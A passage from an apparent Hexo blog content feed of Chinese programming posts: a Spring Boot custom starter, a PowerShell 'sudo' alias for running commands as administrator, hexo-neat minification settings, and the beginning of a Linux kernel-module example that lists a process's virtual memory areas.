class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!--引入spring-boot-starter；所有starter的基本配置--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = "atguigu.hello")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProperties</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String prefix;</span><br><span class="line">    <span class="keyword">private</span> String suffix;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPrefix</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> prefix;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrefix</span><span class="params">(String prefix)</span> {</span><br><span class="line">        <span class="built_in">this</span>.prefix = prefix;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSuffix</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> suffix;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSuffix</span><span class="params">(String suffix)</span> {</span><br><span class="line">        <span class="built_in">this</span>.suffix = suffix;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloService</span> {</span><br><span class="line"></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HelloProperties <span class="title function_">getHelloProperties</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> helloProperties;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHelloProperties</span><span class="params">(HelloProperties helloProperties)</span> {</span><br><span class="line">        <span class="built_in">this</span>.helloProperties = helloProperties;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHellAtguigu</span><span class="params">(String name)</span>{</span><br><span class="line">        <span class="keyword">return</span> helloProperties.getPrefix()+<span class="string">"-"</span> +name + helloProperties.getSuffix();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//web应用才生效</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(HelloProperties.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceAutoConfiguration</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    HelloProperties helloProperties;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">helloService</span><span class="params">()</span>{</span><br><span class="line">        <span class="type">HelloService</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>();</span><br><span class="line">        service.setHelloProperties(helloProperties);</span><br><span class="line">        <span class="keyword">return</span> service;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="更多SpringBoot整合示例"><a href="#更多SpringBoot整合示例" class="headerlink" title="更多SpringBoot整合示例"></a>更多SpringBoot整合示例</h1><p><a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples">https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples</a></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 后端 </tag>
        
            
            
        <tag> springboot </tag>
        
            
            
        <tag> java </tag>
        
            
            
        <tag> spring </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>给你的Powershell做一个“sudo”</title>
      
      
      <link href="/cn/posts/58638/"/>
      
      
      <url>/cn/posts/58638/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p></blockquote><h2 id="开始行动"><a href="#开始行动" class="headerlink" title="开始行动"></a>开始行动</h2><p>在Windows系统上sudo对应的就是管理员权限了。</p><p>一般使用Powershell时，并不会管理员启动，当执行需要权限的命令（比如net start mysql），就需要以管理员打开新的窗口。</p><p>为了一步到位，这里给powershell创建一个<code>alias</code> -&gt; <code>sudo</code> 来运行需要管理员权限的命令。</p><p>在文档目录中(在<code>powershell</code>执行<code>$profile</code>即可输出此文件路径)，新建文件夹<code>WindowsPowerShell</code>，新建文件<code>Microsoft.PowerShell_profile.ps1</code>。</p><blockquote><p>此文件是在启动Powershell时执行的脚本。set-alias 在退出后就会失效，所以放到启动脚本中。</p></blockquote><p>追加如下代码,<strong>然后重启Powershell窗口。</strong></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sudo</span></span> {</span><br><span class="line">    <span class="variable">$ss</span> = <span class="string">"<span class="variable">$args</span> ; pause"</span></span><br><span class="line">    <span class="built_in">Start-Process</span> powershell <span class="literal">-Verb</span> runAs <span class="literal">-ArgumentList</span> <span class="variable">$ss</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">set-alias</span>  <span class="literal">-name</span> sudo <span class="literal">-value</span> _sudo</span><br></pre></td></tr></tbody></table></figure><p>保存后发现无法加载，因为默认不加载外部脚本，管理员权限下 powershell 运行：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></tbody></table></figure><blockquote><p> <strong>REMOTESIGNED</strong> 脚本可以运行。这是 Windows Server 2012 R2 中的默认执行策略。 要求从 Internet 下载的脚本和配置文件（包括电子邮件和即时消息程序）具有受信任的发布者的数字签名。 不要求你在本地计算机上编写的脚本（不是从 Internet 下载的）具有数字签名。 如果脚本已被取消阻止（比如通过使用 Unblock-File cmdlet），则运行从 Internet 下载但未签名的脚本。 存在运行来自 Internet 之外的源的未签名脚本和已签名但却是恶意的脚本的风险。</p></blockquote><p>完成设置后，输入sudo会打开新的窗口执行命令:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/image-20201114173152782.png" alt="image-20201114173152782"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/20191015105843814.png" alt="在这里插入图片描述"></p><p>有时候我们又希望直接输入命令打开新窗口,继续追加如下代码，重启powershell</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">_su</span></span> {<span class="built_in">Start-Process</span> <span class="literal">-verb</span> runas <span class="string">"C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe"</span>}</span><br><span class="line"><span class="built_in">Set-Alias</span> su _su</span><br></pre></td></tr></tbody></table></figure><p>输入su命令后会直接弹出一个新的具有管理员权限的powershell</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/image-20201114173232592.png"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="cmd-提权："><a href="#cmd-提权：" class="headerlink" title="cmd 提权："></a>cmd 提权：</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:hackett_yu@outlook.com cmd</span><br><span class="line">doskey sudo=runas /user:{$username} cmd</span><br></pre></td></tr></tbody></table></figure><h3 id="快速进入命令行的方法"><a href="#快速进入命令行的方法" class="headerlink" title="快速进入命令行的方法"></a>快速进入命令行的方法</h3><p>如何从你的文件夹里快速打开命令行？请看下面</p><p>1.将鼠标置于指定文件的空白处，按住Shift键的同时右击鼠标，这时在出来的右键菜单里会出现一个”打开命令行”  的菜—单选项，也有可能是“在此处打开Powershell窗口(s)”。这个具体和电脑个体设置有关。</p><p>2.直接在指定目录的地址栏中输入<code>cmd</code>,即可进入命令行模式，同理输入powershell也可以</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/image-20201114173854864.png" alt="image-20201114173854864"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/image-20201114173917127.png" alt="image-20201114173917127"></p><p>3.安装Windows Terminal ，在应用商店即可下载。（在地址栏输入wt也可以快速调出，但是不会定位到当前目录）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/58638/image-20201114174133879.png" alt="image-20201114174133879"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>github+docker+阿里云 自动部署</title>
      
      
      <link href="/cn/posts/35865/"/>
      
      
      <url>/cn/posts/35865/</url>
      
      
        
      <content type="html"><![CDATA[<p>等待更新</p>]]></content>
      
      
      
      
    
    </entry>
    <entry>
      
      
      <title>本站从即日起全面启用全站网页压缩</title>
      
      
      <link href="/cn/posts/5772/"/>
      
      
      <url>/cn/posts/5772/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="为什么要压缩页面静态资源"><a href="#为什么要压缩页面静态资源" class="headerlink" title="为什么要压缩页面静态资源"></a>为什么要压缩页面静态资源</h1><p>对于个人博客来说，优化页面的访问速度是很有必要的，如果打开你的个人站点，加载个首页就要十几秒，页面长时间处于空白状态，想必没什么人能够忍受得了吧。我个人觉得，如果能把页面的加载时间控制在三四秒内，就很不错了。</p><p>那么怎么提高博客的页面加载速度呢？可以从以下的几个方面去入手： </p><ol><li>将js文件尽可能放置到body的闭合标签之前，因为在加载或者引入js文件时是阻塞式的，如果我们在页面的最开始就引入这些js文件，而这些文件又比较大，会造成页面在渲染时长时间处于白屏状态。</li><li>尽量避免去引用访问速度非常低下的cdn或者图片，可以改用访问速度更快的cdn，或者将难以迅速加载的图片保存到自己的站点目录下，以免在加载图片时耗费了大量的时间，最后还加载不出来。</li><li>对页面的静态资源进行压缩，包括css、js和html等文件。我们自己添加的css和js文件为了可读性，往往会有很多换行和空格，这些对于浏览器来说并没什么用，甚至还会降低渲染页面的速度。至于html文件，由于Markdown转成html的bug，会导致页面存在大量的空白，如果你查看下页面的源代码，就会发现这些大量的空白符，十分难看。这也会造成页面渲染的性能问题。</li></ol><p><strong>本站主博客由jekyll构成，子博客由hexo构成，目前均已启用静态网页资源的压缩。</strong></p><h1 id="hexo的压缩静态资源插件"><a href="#hexo的压缩静态资源插件" class="headerlink" title="hexo的压缩静态资源插件"></a>hexo的压缩静态资源插件</h1><p>网上有很多相关的博文，常规的做法是使用<code>gulp</code>来进行压缩，<code>gulp</code>是<code>Node.js</code>下的自动构建工具，通过一列的task执行步骤进行自动流程化处理。</p><p>使用这种方法会比较麻烦，每次压缩时还需要输入额外的命令，比较繁琐，个人不是很喜欢，有兴趣的可以去自己了解下<a href="https://segmentfault.com/a/1190000009544924#articleHeader8">相关的东西</a>。这篇教程里很多详细的说明，里边有说到gulp的使用，绝对的精品文章。</p><p>这里我选择的是由rozbo大佬开发的<code>hexo-neat</code>压缩插件，配置简单，无需额外命令，你只要使用原本的调试三连或者部署三连就可以自动帮你完成静态资源的压缩！</p><h2 id="如何使用hexo-neat"><a href="#如何使用hexo-neat" class="headerlink" title="如何使用hexo-neat"></a>如何使用hexo-neat</h2><h3 id="在站点根目录下安装hexo-neat"><a href="#在站点根目录下安装hexo-neat" class="headerlink" title="在站点根目录下安装hexo-neat"></a>在站点根目录下安装hexo-neat</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-neat --save1</span><br></pre></td></tr></tbody></table></figure><h3 id="为站点配置文件添加相关配置"><a href="#为站点配置文件添加相关配置" class="headerlink" title="为站点配置文件添加相关配置"></a>为站点配置文件添加相关配置</h3><p>下边是我自己站点的相关配置，直接添加到站点配置文件<code>_config.yml</code>的末尾就可以。可以安装自己的需求去自定义配置，不过有些注意事项，可以参考我后文的踩坑记录。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># hexo-neat</span><br><span class="line"># 博文压缩</span><br><span class="line">neat_enable: true</span><br><span class="line"># 压缩html</span><br><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"># 压缩css  </span><br><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.css'</span><br><span class="line"># 压缩js</span><br><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.js'</span><br><span class="line">    - '**/jquery.fancybox.pack.js'</span><br><span class="line">    - '**/index.js'  12345678910111213141516171819202122</span><br></pre></td></tr></tbody></table></figure><h2 id="hexo-neat插件踩坑记录"><a href="#hexo-neat插件踩坑记录" class="headerlink" title="hexo-neat插件踩坑记录"></a>hexo-neat插件踩坑记录</h2><p>由于在使用hexo-neat插件时，可以在命令窗口中看到各个文件的压缩率，于是我就开始捣鼓跳过哪些文件可以让效率更高。在鼓捣了一段时间之后，记录下使用该插件的一些注意事项，避免日后重蹈覆辙，也希望能对各位看官有所帮助。</p><h3 id="跳过压缩文件的正确配置方式"><a href="#跳过压缩文件的正确配置方式" class="headerlink" title="跳过压缩文件的正确配置方式"></a>跳过压缩文件的正确配置方式</h3><p>如果按照官方插件的文档说明来配置<code>exclude</code>，你会发现完全不起作用。这是因为配置的文件路径不对，压缩时找不到你配置的文件，自然也就无法跳过了。你需要给这些文件指定正确的路径，万能的配置方式如下：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">    - '**/*.min.css'1234</span><br></pre></td></tr></tbody></table></figure><h3 id="压缩html时不要跳过-md文件"><a href="#压缩html时不要跳过-md文件" class="headerlink" title="压缩html时不要跳过.md文件"></a>压缩html时不要跳过<code>.md</code>文件</h3><p><code>.md</code>文件就是我们写文章时的markdown文件，如果跳过压缩<code>.md</code>文件，而你又刚好在文章中使用到了NexT自带的tab标签，那么当hexo在生成静态页面时就会发生解析错误。这会导致使用到了tab标签的页面生成失败而无法访问。</p><p>当初为了找到这个原因花了我两个晚上的时间，简直是夜不能寐。</p><h3 id="压缩html时不要跳过-swig文件"><a href="#压缩html时不要跳过-swig文件" class="headerlink" title="压缩html时不要跳过.swig文件"></a>压缩html时不要跳过<code>.swig</code>文件</h3><p><code>.swig</code>文件是模板引擎文件，简单的说hexo可以通过这些文件来生成对应的页面。如果跳过这些文件，那么你将会发现，你的所有页面完全没有起到压缩的效果，页面源代码里依然存在着一大堆空白。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://github.com/rozbo/hexo-neat">GitHub项目地址</a></li><li><a href="https://segmentfault.com/a/1190000008082288">hexo博客压缩优化</a></li><li><a href="https://segmentfault.com/a/1190000005799759">Hexo-Neat介绍</a></li></ol><h1 id="jekyll的压缩"><a href="#jekyll的压缩" class="headerlink" title="jekyll的压缩"></a>jekyll的压缩</h1><p>稍后更新</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 运维 </tag>
        
            
            
        <tag> 前端 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Linux内核模块编程小例子之查看虚拟内存VMA(virtual memory areas）信息</title>
      
      
      <link href="/cn/posts/33535/"/>
      
      
      <url>/cn/posts/33535/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。</p><p>用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分：</p><p>（1） 代码段：可执行文件的二进制代码</p><p>（2） 数据段：存储全局变量</p><p>（3） 栈：用于保存局部变量和实现函数调用</p><p>（4） 环境变量和命令行参数</p><p>（5） 程序使用的动态库的代码</p><p>（6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。</p><p>每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。</p><p>本文将编写一个内核模块，通过此内核模块遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。  </p></blockquote><p><strong>本文所使用的环境：</strong></p><blockquote><p>操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p>gcc: 7.5.0</p><p>make:GNU Make 4.1</p></blockquote><ol><li><h5 id="编写模块程序"><a href="#编写模块程序" class="headerlink" title="编写模块程序"></a>编写模块程序</h5><p>参考代码如下，代码文件命名为“vma_test.c”</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vma_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pid;</span><br><span class="line">module_param(pid, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printit</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">  <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> start, end, length;</span><br><span class="line"></span><br><span class="line">  mm = tsk-&gt;mm;</span><br><span class="line">  pr_info(<span class="string">"mm_struct addr = 0x%p\n"</span>, mm);</span><br><span class="line">  vma = mm-&gt;mmap;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 mmap_sem 读写信号量进行保护 */</span></span><br><span class="line">  down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">  pr_info(<span class="string">"vmas: vma start end length\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (vma) {</span><br><span class="line">      j++;</span><br><span class="line">      start = vma-&gt;vm_start;</span><br><span class="line">      end = vma-&gt;vm_end;</span><br><span class="line">      length = end - start;</span><br><span class="line">      pr_info(<span class="string">"%6d: %16p %12lx %12lx %8ld\n"</span>,</span><br><span class="line">          j, vma, start, end, length);</span><br><span class="line">      vma = vma-&gt;vm_next;</span><br><span class="line">  }</span><br><span class="line">  up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vma_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">  <span class="comment">/* 如果插入模块时未定义 pid 号，则使用当前 pid */</span></span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">      tsk = current;</span><br><span class="line">      pid = current-&gt;pid;</span><br><span class="line">      pr_info(<span class="string">"using current process\n"</span>);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">      tsk = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!tsk)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pr_info(<span class="string">" Examining vma's for pid=%d, command=%s\n"</span>, pid, tsk-&gt;comm);</span><br><span class="line">  printit(tsk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vma_exit</span><span 